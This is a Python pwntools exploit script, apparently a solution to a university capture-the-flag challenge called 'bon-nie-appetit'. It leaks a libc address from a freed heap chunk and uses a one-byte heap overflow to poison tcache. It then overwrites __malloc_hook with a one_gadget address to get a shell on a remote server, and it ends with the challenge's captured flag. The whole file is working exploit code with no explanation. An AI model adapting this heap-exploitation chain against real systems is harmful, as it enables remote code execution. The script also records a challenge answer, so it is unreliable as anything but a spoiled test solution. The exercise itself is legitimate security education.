from pwn import *


libc = ELF('glibc/libc.so.6')          # Load appropriate library
rop = ROP(libc) 
context.clear(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

gadget1off = 0x4f2a5

gadget2off = 0x4f302

gadget3off = 0x10a2fc

r = remote("cs4401shell2.walls.ninja",31376)

def make_order(size: int, data: bytes):
    p.recvuntil(b'> ', timeout=1)
    p.send(b'1')
    p.recvuntil(b'many: ')

    # convert the int size to bytes, e.g. 248 -> b'248'
    p.send(str(size).encode())

    p.recvuntil(b'order: ')
    p.send(data)

def show_order(order_index: int):
    p.recvuntil(b'> ', timeout=1)
    p.send(b'2')
    p.recvuntil(b'order: ')
    p.send(str(order_index).encode())

def edit_order(order_index: int, new_data: bytes):
    p.recvuntil(b'> ', timeout=1)
    p.send(b'3')
    p.recvuntil(b'order: ')
    p.send(str(order_index).encode())
    p.recvuntil(b'order: ')
    p.send(new_data)

def delete_order(order_index: int):
    p.recvuntil(b'> ', timeout=1)
    p.send(b'4')
    p.recvuntil(b'order: ')
    p.send(str(order_index).encode())

def u64v(b: bytes) -> int:
    return u64(b.ljust(8, b'\x00'))


# p = process('./bon-nie-appetit')
p = remote("cs4401shell2.walls.ninja",31376)


make_order(0x1000, b'a'*0x1000)
make_order(0x10, b'b'*0x10)

delete_order(0)

make_order(0x1000, b'c'*0x8)

context.clear(arch='amd64', log_level='debug')

p.send(b'2')
p.recvuntil(b'order:')
p.sendline(b'0')
p.recvline()
preLeak = p.recvline().strip()
leak = preLeak[-6:]
leakAddr = u64(leak.ljust(8,b"\x00"))
log.info(f"{leak}")
log.info(f"{hex(leakAddr)}")

_libc_base = leakAddr - 0x3ebca0

malloc__hook = _libc_base + libc.symbols["__malloc_hook"]

# c is order 0, b is order 1
# d is order 2, e is order 3, f is order 4

make_order(0x18, b'd'*0x18)
make_order(0x18, b'e'*0x18)
make_order(0x18, b'f'*0x18)

delete_order(4)
edit_order(2, b'd'*0x18+b'\x41')
delete_order(3)
make_order(0x38, b'g'*0x18+flat({0:0x21, 8: malloc__hook}))

make_order(0x18, b'g'*0x18)
make_order(0x18, flat(_libc_base + gadget3off))

# make_order(3,'win')

p.interactive()

#Dir: /problems/bon-nie-appetit_0_22d6b3480d1786803459f568c19f5c83
#flag: bdfed9a0bd7b188a0898037073c77dd3
